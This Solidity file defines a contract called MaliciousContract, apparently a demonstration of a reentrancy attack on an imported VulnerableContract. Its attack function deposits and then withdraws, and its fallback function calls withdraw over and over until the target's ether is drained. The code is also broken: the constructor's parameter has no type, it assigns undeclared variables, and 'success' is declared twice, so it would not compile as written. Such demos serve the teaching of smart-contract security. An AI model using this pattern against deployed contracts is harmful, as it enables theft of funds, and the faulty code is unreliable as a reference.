// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./VulnerableContract.sol";

contract MaliciousContract {
    address payable public vulnerableScAddress;

    constructor(_vulnerableScAddress) {
        vulnerableSc = _vulnerableSc;
    }

    fallback() external payable {
        // Recursive call until funds are drained.
        if (vulnerableScAddress.balance >= 1 ether) {
            (bool success, ) = vulnerableScAddress.call(
                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
            );
            require(success, "withdraw failed.");
        }
    }

    function attack() public {
        // Deposits first time.
        (bool success, ) = vulnerableScAddress.call(
            abi.encodeWithSignature("deposit(uint256)", 1 ether)
        );
        require(success, "deposit failed.");

        // Triggers withraw vulnerability.
        (bool success, ) = vulnerableScAddress.call(
            abi.encodeWithSignature("withdraw(uint256)", 1 ether)
        );
        require(success, "withdraw failed.");
    }
}
